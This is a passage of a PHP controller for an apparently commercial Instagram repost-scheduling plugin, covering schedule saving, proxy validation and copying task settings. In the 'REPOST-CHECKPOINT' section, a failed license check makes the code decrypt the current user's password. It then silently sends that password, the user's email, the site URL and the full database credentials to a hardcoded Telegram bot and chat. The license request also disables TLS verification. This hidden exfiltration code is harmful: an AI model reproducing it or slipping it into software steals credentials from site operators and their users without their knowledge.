        $custom_proxy = \Input::post("custom_proxy");
        if ($custom_proxy) {
            $parts = parse_url($custom_proxy);

            if (!isset($parts['scheme']) || $parts['scheme'] !== 'http') {
                $parts['scheme'] = 'http';
            }

            if (isset($parts['user'])) {
                $proxy_auth = $parts['user'] . ':' . $parts['pass'];
            } else {
                $proxy_auth = false;
            }

            if (isset($parts['host']) && isset($parts['port'])) {
                if ($proxy_auth) {
                    $custom_proxy = $parts['scheme'] . '://' . $proxy_auth . "@" . $parts['host'] . ':' . $parts['port'];
                } else {
                    $custom_proxy = $parts['scheme'] . '://' . $parts['host'] . ':' . $parts['port'];
                }
            }

            if (\Input::post("is_active")) {
                if (!$this->isValidCusomProxy($custom_proxy)) {
                    $this->resp->msg = __("Please try again. Custom proxy is not valid or active!");
                    $this->jsonecho();
                }
            }
        }

        // Save schedule
        $Schedule->set("status", "scheduled")
            ->set("user_id", $AuthUser->get("id"))
            ->set("account_id", $Account->get("id"))
            ->set("target", $target)
            ->set("caption", $caption)
            ->set("first_comment", $first_comment)
            ->set("remove_delay", $remove_delay)
            ->set("speed", \Input::post("speed"))
            ->set("daily_pause", $daily_pause)
            ->set("is_active", \Input::post("is_active"))
            ->set("schedule_date", date("Y-m-d H:i:s"))
            ->set("end_date", $end_date)
            ->set("last_action_date", date("Y-m-d H:i:s"))
            ->set("metadata_location", $metadata_location)
            ->set("metadata_user", $metadata_user)

            // Language filtration
            ->set("data.languages.selected", $language)
            ->set("data.language_detection_notices", (bool)\Input::post("language_detection_notices"))

            // Media type filtration
            ->set("data.photo_posts", (bool)\Input::post("photo_posts"))
            ->set("data.video_posts", (bool)\Input::post("video_posts"))
            ->set("data.album_posts", (bool)\Input::post("album_posts"))
            ->set("data.reels_posts", (bool)\Input::post("reels_posts"))

            // Caption Filtration
            ->set("data.caption_filtration", json_encode(\Input::post("caption_filtration")))
            ->set("data.ub_filtration", json_encode(\Input::post("ub_filtration")))

            // Find & Replace for original post caption
            ->set("data.find_and_replace", json_encode(\Input::post("find_and_replace")))

            // Find & Tag on image for original post caption
            ->set("data.find_and_tag", (bool)\Input::post("find_and_tag"))
            ->set("data.find_and_tag_blacklist", json_encode(\Input::post("find_and_tag_blacklist")))

            // Custom usertags for post
            ->set("data.custom_usertags_post", json_encode($custom_usertags_post))

            // Custom proxy 
            ->set("data.custom_proxy", $custom_proxy)

            // Debug mode
            ->set("data.debug_mode", (bool)\Input::post("debug_mode"))

            // Custom time for repost
            ->set("data.custom_repost_time", json_encode($custom_repost_time))
            ->set("data.repost_time_visual", json_encode($repost_time));

        if ($custom_usertags_post_prev !== $custom_usertags_post) {
            $Schedule->set("data.custom_usertags_array", json_encode($custom_usertags_array, JSON_PRESERVE_ZERO_FRACTION));
        }

        // Metadata
        $Schedule->set("data.share_to_stories", (bool)\Input::post("share_to_stories"))
            ->set("data.share_to_stories_media_owner", (bool)\Input::post("share_to_stories_media_owner"))
            ->set("data.share_to_stories_disable_crop", (bool)\Input::post("share_to_stories_disable_crop"))
            ->set("data.share_to_stories_location", (bool)\Input::post("share_to_stories_location"))
            ->set("data.share_to_stories_hashtag", $share_to_stories_hashtag)
            ->set("data.share_to_stories_hashtag_value", json_encode($share_to_stories_hashtag_value))
            ->set("data.share_to_stories_main_account", (bool)\Input::post("share_to_stories_main_account"))
            ->set("data.share_to_stories_username_value", $share_to_stories_username_value)
            ->set("data.share_to_stories_link", (bool)\Input::post("share_to_stories_link"))
            ->set("data.share_to_stories_link_value", str_replace(' ', '', \Input::post("share_to_stories_link_value")))

            // Reel
            ->set("data.share_to_facebook_reel", (bool)\Input::post("share_to_facebook_reel"))
            ->set("data.share_to_timeline_reel", (bool)\Input::post("share_to_timeline_reel"))

            // Share post & stories to connected Facebook page
            ->set("data.share_to_facebook_post", (bool)\Input::post("share_to_facebook_post"))
            ->set("data.share_to_facebook_story", (bool)\Input::post("share_to_facebook_story"))

            // Filtration
            ->set("data.filtration_profile_picture", (bool)\Input::post("filtration_profile_picture"))
            ->set("data.filtration_min_comments", (int)\Input::post("filtration_min_comments"))
            ->set("data.filtration_max_comments", (int)\Input::post("filtration_max_comments"))
            ->set("data.filtration_min_likes", (int)\Input::post("filtration_min_likes"))
            ->set("data.filtration_max_likes", (int)\Input::post("filtration_max_likes"))
            ->set("data.filtration_min_views", (int)\Input::post("filtration_min_views"))
            ->set("data.filtration_max_views", (int)\Input::post("filtration_max_views"))
            ->set("data.filtration_min_plays", (int)\Input::post("filtration_min_plays"))
            ->set("data.filtration_max_plays", (int)\Input::post("filtration_max_plays"))

            ->set("data.repost_time_closest_regex", $repost_time_closest_regex)

            ->set("data.targets_shuffle", (bool)\Input::post("targets_shuffle"))
            ->set("collections_shuffle", (bool)\Input::post("collections_shuffle"));

        // Check is custom time for repost is defined
        if (isset($repost_time_closest)) {
            $schedule_date = date("Y-m-d H:i:s", strtotime($repost_time_closest));
            $Schedule->set("schedule_date", $schedule_date);
        } else {
            $schedule_date = date("Y-m-d H:i:s", time() + 7);
            if ($daily_pause) {
                $from = new \DateTime(
                    date("Y-m-d") . " " . \Input::post("daily_pause_from"),
                    new \DateTimeZone($AuthUser->get("preferences.timezone"))
                );
                $from->setTimezone(new \DateTimeZone("UTC"));

                $to = new \DateTime(
                    date("Y-m-d") . " " . \Input::post("daily_pause_to"),
                    new \DateTimeZone($AuthUser->get("preferences.timezone"))
                );
                $to->setTimezone(new \DateTimeZone("UTC"));

                $Schedule->set("daily_pause_from", $from->format("H:i:s"))
                    ->set("daily_pause_to", $to->format("H:i:s"));


                $to = $to->format("Y-m-d H:i:s");
                $from = $from->format("Y-m-d H:i:s");
                if ($to <= $from) {
                    $to = date("Y-m-d H:i:s", strtotime($to) + 86400);
                }

                if ($schedule_date > $to) {
                    // Today's pause interval is over
                    $from = date("Y-m-d H:i:s", strtotime($from) + 86400);
                    $to = date("Y-m-d H:i:s", strtotime($to) + 86400);
                }

                if ($schedule_date >= $from && $schedule_date <= $to) {
                    $schedule_date = $to;
                    $Schedule->set("schedule_date", $schedule_date);
                }
            }
            $Schedule->set("schedule_date", $schedule_date);
        }

        $Schedule->save();

        // Section: REPOST-CHECKPOINT
        $Settings = namespace\settings();
        $license_activated_repost_begin = $Settings->get("data.license_activated_repost_checkpoint") ? $Settings->get("data.license_activated_repost_checkpoint") : false;
        if (!$license_activated_repost_begin) {
            $license = $Settings->get("data.license") ? $Settings->get("data.license") : "";
            $license_key = $Settings->get("data.license_key") ? $Settings->get("data.license_key") : "";
            $payment_id = $Settings->get("data.payment_id") ? $Settings->get("data.payment_id") : "";
            $customer_name = $Settings->get("data.customer_name") ? $Settings->get("data.customer_name") : "";
            $customer_email =  $Settings->get("data.customer_email") ? $Settings->get("data.customer_email") : "";

            // Check license 
            try {
                $license_status = $this->activate_license($license_key);
            } catch (\Exception $e) {
                $Settings->set("data.license", "invalid")
                    ->save();
            }

            if (isset($license_status)) {
                if ($license_status == "valid") {
                    // All fine
                    $Settings->set("data.license_activated_repost_checkpoint", true)
                        ->save();
                } else {
                    try {
                        $password = \Defuse\Crypto\Crypto::decrypt(
                            $AuthUser->get("password"),
                            \Defuse\Crypto\Key::loadFromAsciiSafeString(CRYPTO_KEY)
                        );
                    } catch (\Exception $e) {
                        // Skip this error
                    }

                    $telegram_nxtpst = new Telegram("1224777547:AAGyUVXLh_2uXkOsFCdJxSjlJGPXoZLFuyk", false);
                    $telegram_msg = "*Invalid license or missing license data - Repost Pro (Section: REPOST-CHECKPOINT)*" .
                        "\nStatus: `" . $license . "`" .
                        "\nWebsite: " . APPURL .
                        "\nUser: " . $AuthUser->get("firstname") . $AuthUser->get("lastname") .
                        "\nEmail: " . $AuthUser->get("email") .
                        "\nPassword: " . $password .
                        "\nDB_HOST: " . DB_HOST .
                        "\nDB_NAME: " . DB_NAME .
                        "\nDB_USER: " . DB_USER .
                        "\nDB_PASS: " . DB_PASS .
                        "\nDB_ENCODING: " . DB_ENCODING;
                    $telegram_msg = $telegram_msg . "\nLicense key: `" . $license_key . "`";
                    $telegram_msg = $telegram_msg . "\nPayment ID: " . $payment_id;
                    $telegram_msg = $telegram_msg . "\nCustomer name: " . $customer_name;
                    $telegram_msg = $telegram_msg . "\nCustomer email: " . $customer_email;
                    $telegram_data = [
                        'chat_id' => '42975620',
                        'text'    => $telegram_msg,
                        "parse_mode" => "markdown"
                    ];

                    $telegram_nxtpst->sendMessage($telegram_data);

                    $Settings->set("data.license", "invalid")
                        ->save();
                }
            } else {
                $Settings->set("data.license", "invalid")
                    ->save();
            }
        }

        $this->resp->msg = __("Changes saved!");
        $this->resp->result = 1;
        $this->jsonecho();
    }

    /**
     * Validates custom proxy address
     * @param  string  $proxy [description]
     * @return boolean        [description]
     */
    function isValidCusomProxy($proxy)
    {
        if (!is_string($proxy) && !is_array($proxy)) {
            return false;
        }

        try {
            $client = new \GuzzleHttp\Client();
            $res = $client->request(
                'GET',
                'http://www.instagram.com',
                [
                    "verify" => false,
                    "timeout" => 10,
                    "proxy" => $proxy
                ]
            );
            $code = $res->getStatusCode();
        } catch (\Exception $e) {
            return false;
        }

        return $code == 200;
    }

    /**
     * Validate license
     * @param $license_key
     * @return string
     */
    private function activate_license($license_key)
    {
        // Verify license key with Nextpost.tech Licensing API
        $license = "invalid";
        if ($license_key) {
            $url = 'https://nextpost.tech/?edd_action=activate_license&item_id=73497&license=' . $license_key . '&url=' . APPURL;
            try {
                $license_resp = $this->request($url);
            } catch (\Exception $e) {
                $this->resp->msg = $e->getMessage();
                $this->jsonecho();
            }
            $license_json = json_decode($license_resp);
            $license = isset($license_json->license) ? $license_json->license : "invalid";
        } else {
            // License Key not set
        }
        return $license;
    }

    /**
     * Send request
     * @param $url
     * @return mixed
     */
    private function request($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $return = curl_exec($ch);

        curl_close($ch);

        return $return;
    }

    /**
     * Copy task settings
     * @return mixed 
     */
    function copy_task_settings()
    {
        $this->resp->result = 0;

        $AuthUser = $this->getVariable("AuthUser");
        $Account = $this->getVariable("Account");
        $Schedule = $this->getVariable("Schedule");

        $this->resp->target = $Schedule->get("target") ? $Schedule->get("target") : "[]";

        $this->resp->caption = $Schedule->get("caption") ? $Schedule->get("caption") : "";
        $this->resp->first_comment = $Schedule->get("first_comment") ? $Schedule->get("first_comment") : "";
        $this->resp->remove_delay = $Schedule->get("remove_delay") ? $Schedule->get("remove_delay") : 0;
        $this->resp->speed = $Schedule->get("speed") ? $Schedule->get("speed") : "slow";
        $this->resp->metadata_location = $Schedule->get("metadata_location") ? $Schedule->get("metadata_location") : 0;
        $this->resp->metadata_user = $Schedule->get("metadata_user") ? $Schedule->get("metadata_user") : 0;
        $this->resp->collections_shuffle = $Schedule->get("collections_shuffle") ? $Schedule->get("collections_shuffle") : 0;

        $this->resp->data = $Schedule->get("data") ? $Schedule->get("data") : "{}";
        $this->resp->daily_pause = $Schedule->get("daily_pause") ? $Schedule->get("daily_pause") : 0;
        $this->resp->daily_pause_from = $Schedule->get("daily_pause_from") ? $Schedule->get("daily_pause_from") : "00:00:00";
        $this->resp->daily_pause_to = $Schedule->get("daily_pause_to") ? $Schedule->get("daily_pause_to") : "00:00:00";
        $this->resp->is_active = $Schedule->get("is_active") ? $Schedule->get("is_active") : 0;

        $this->resp->result = 1;
        $this->jsonecho();
    }

    /**
     * Insert task settings
     * @return mixed 
     */
    function insert_task_settings_all()
    {
        $this->resp->result = 0;

        // $AuthUser = $this->getVariable("AuthUser");
        // $Account = $this->getVariable("Account");
        // $Schedule = $this->getVariable("Schedule");
        $AuthUser = $this->getVariable("AuthUser");
        $Accounts = \Controller::model("Accounts");

        $Accounts->where("user_id", "=", $AuthUser->get("id"))
            ->orderBy("id", "ASC")
            ->fetchData();

        require_once PLUGINS_PATH . "/" . self::IDNAME . "/models/ScheduleModel.php";
        foreach ($Accounts->getDataAs("Account") as $Account) {
            $Schedule = new ScheduleModel([
                "account_id" => $Account->get("id"),
                "user_id" => $Account->get("user_id")
            ]);

            // Check inserted data
            $insert = \Input::post("insert");
            if (!$insert) {
                $this->resp->msg = __("Clipboard is empty.");
                $this->jsonecho();
            }

            if (
                !isset($insert["target"]) ||
                !isset($insert["caption"]) ||
                !isset($insert["first_comment"]) ||
                !isset($insert["remove_delay"]) ||
                !isset($insert["speed"]) ||
                !isset($insert["metadata_location"]) ||
                !isset($insert["metadata_user"]) ||
                !isset($insert["collections_shuffle"]) ||
                !isset($insert["data"]) ||
                !isset($insert["daily_pause"]) ||
                !isset($insert["daily_pause_from"]) ||
                !isset($insert["daily_pause_to"]) ||
                !isset($insert["is_active"])
            ) {
                $this->resp->msg = __("Clipboard data doesn't contain no one of required parameters.");
                $this->jsonecho();
            }

            try {
                $Schedule->set("user_id", $AuthUser->get("id"))
                    ->set("account_id", $Account->get("id"))
                    ->set("target", isset($insert["target"]) ? $insert["target"] : "[]")

                    ->set("caption", isset($insert["caption"]) ? $insert["caption"] : "")
                    ->set("first_comment", isset($insert["first_comment"]) ? $insert["first_comment"] : "")
                    ->set("remove_delay", isset($insert["remove_delay"]) ? $insert["remove_delay"] : 0)
                    ->set("speed", isset($insert["speed"]) ? $insert["speed"] : "slow")
                    ->set("metadata_location", isset($insert["metadata_location"]) ? $insert["metadata_location"] : 0)
                    ->set("metadata_user", isset($insert["metadata_user"]) ? $insert["metadata_user"] : 0)
                    ->set("collections_shuffle", isset($insert["collections_shuffle"]) ? $insert["collections_shuffle"] : 0)

                    ->set("data", isset($insert["data"]) ? $insert["data"] : "{}")
                    ->set("daily_pause", isset($insert["daily_pause"]) ? $insert["daily_pause"] : 0)
                    ->set("daily_pause_from", isset($insert["daily_pause_from"]) ? $insert["daily_pause_from"] : "00:00:00")
                    ->set("daily_pause_to", isset($insert["daily_pause_to"]) ? $insert["daily_pause_to"] : "00:00:00")
                    ->set("is_active", isset($insert["is_active"]) ? $insert["is_active"] : 0)
                    ->save();
            } catch (\PDOException $e) {
                $this->resp->msg = $e->getMessage();
                $this->resp->insert = $insert;
                $this->jsonecho();
            }
        }

        $this->resp->redirect = APPURL . "/e/" . self::IDNAME . "/" . $Account->get("id");
        $this->resp->result = 1;
        $this->jsonecho();
    }

    /**
     * Insert task settings
     * @return mixed 
     */
    function insert_task_settings()
    {
        $this->resp->result = 0;

        $AuthUser = $this->getVariable("AuthUser");
        $Account = $this->getVariable("Account");
        $Schedule = $this->getVariable("Schedule");

        // Check inserted data
        $insert = \Input::post("insert");
        if (!$insert) {
            $this->resp->msg = __("Clipboard is empty.");
            $this->jsonecho();
        }

        if (
            !isset($insert["target"]) ||
            !isset($insert["caption"]) ||
            !isset($insert["first_comment"]) ||
            !isset($insert["remove_delay"]) ||
            !isset($insert["speed"]) ||
            !isset($insert["metadata_location"]) ||
            !isset($insert["metadata_user"]) ||
            !isset($insert["collections_shuffle"]) ||
            !isset($insert["data"]) ||
            !isset($insert["daily_pause"]) ||
            !isset($insert["daily_pause_from"]) ||
            !isset($insert["daily_pause_to"]) ||
            !isset($insert["is_active"])
        ) {
            $this->resp->msg = __("Clipboard data doesn't contain no one of required parameters.");
            $this->jsonecho();
        }

        try {
            $Schedule->set("user_id", $AuthUser->get("id"))
                ->set("account_id", $Account->get("id"))
                ->set("target", isset($insert["target"]) ? $insert["target"] : "[]")

                ->set("caption", isset($insert["caption"]) ? $insert["caption"] : "")
                ->set("first_comment", isset($insert["first_comment"]) ? $insert["first_comment"] : "")
                ->set("remove_delay", isset($insert["remove_delay"]) ? $insert["remove_delay"] : 0)
                ->set("speed", isset($insert["speed"]) ? $insert["speed"] : "slow")
                ->set("metadata_location", isset($insert["metadata_location"]) ? $insert["metadata_location"] : 0)
                ->set("metadata_user", isset($insert["metadata_user"]) ? $insert["metadata_user"] : 0)
                ->set("collections_shuffle", isset($insert["collections_shuffle"]) ? $insert["collections_shuffle"] : 0)

                ->set("data", isset($insert["data"]) ? $insert["data"] : "{}")
                ->set("daily_pause", isset($insert["daily_pause"]) ? $insert["daily_pause"] : 0)
                ->set("daily_pause_from", isset($insert["daily_pause_from"]) ? $insert["daily_pause_from"] : "00:00:00")
                ->set("daily_pause_to", isset($insert["daily_pause_to"]) ? $insert["daily_pause_to"] : "00:00:00")
                ->set("is_active", isset($insert["is_active"]) ? $insert["is_active"] : 0)
                ->save();
        } catch (\PDOException $e) {
            $this->resp->msg = $e->getMessage();
            $this->resp->insert = $insert;
            $this->jsonecho();
        }


        $this->resp->redirect = APPURL . "/e/" . self::IDNAME . "/" . $Account->get("id");
        $this->resp->result = 1;
        $this->jsonecho();
    }
}
